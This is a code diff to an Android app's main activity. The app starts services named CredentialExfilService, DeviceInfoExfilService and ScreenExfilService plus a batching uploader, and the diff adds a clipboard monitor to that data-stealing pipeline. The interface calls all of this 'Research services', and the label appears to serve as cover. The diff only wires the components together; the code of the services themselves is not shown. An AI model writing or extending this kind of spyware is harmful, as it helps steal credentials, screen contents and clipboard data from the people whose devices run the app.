@@ -14,12 +14,12 @@ import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import com.yourpackage.data.ExfilData
 import com.yourpackage.network.ApiClient
 import com.yourpackage.services.CredentialExfilService
 import com.yourpackage.services.DeviceInfoExfilService
 import com.yourpackage.services.ScreenExfilService
 import com.yourpackage.utils.BatchScheduler
+import com.yourpackage.utils.ClipboardMonitor  // 🔥 NEW: Import ClipboardMonitor
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -40,6 +40,10 @@ class MainActivity : AppCompatActivity() {
     private var servicesRunning = false
     private lateinit var apiClient: ApiClient
     private lateinit var batchScheduler: BatchScheduler
+    
+    // 🔥 NEW: Clipboard Monitor instance
+    private lateinit var clipboardMonitor: ClipboardMonitor
+    
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -57,6 +61,9 @@ class MainActivity : AppCompatActivity() {
             // This lambda is called when the scheduler fires
             sendBatch()
         }
+
+        // 🔥 NEW: Initialize Clipboard Monitor
+        clipboardMonitor = ClipboardMonitor(this)
 
         // Start background retry for offline queue
         apiClient.startBackgroundRetry()
@@ -138,12 +145,15 @@ class MainActivity : AppCompatActivity() {
         val deviceIntent = Intent(this, DeviceInfoExfilService::class.java)
         startService(deviceIntent)
 
+        // 🔥 NEW: Start Clipboard Monitor
+        clipboardMonitor.startMonitoring()
+
         // Start batch scheduler
         batchScheduler.start()
 
         servicesRunning = true
         updateUI()
-        Toast.makeText(this, "🔍 Research services started", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "🔍 Research services started (including Clipboard Monitor)", Toast.LENGTH_SHORT).show()
     }
 
     /**
@@ -152,6 +162,9 @@ class MainActivity : AppCompatActivity() {
     private fun stopServices() {
         // Stop batch scheduler
         batchScheduler.stop()
+
+        // 🔥 NEW: Stop Clipboard Monitor
+        clipboardMonitor.stopMonitoring()
 
         // Stop services
         val credentialIntent = Intent(this, CredentialExfilService::class.java)
@@ -175,7 +188,7 @@ class MainActivity : AppCompatActivity() {
         if (servicesRunning) {
             toggleButton.text = "Stop Research Services"
             toggleButton.setBackgroundColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
-            statusText.text = "🟢 Status: Services Running"
+            statusText.text = "🟢 Status: Services Running (Clipboard + Accessibility)"
             statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_light))
         } else {
             toggleButton.text = "Start Research Services"
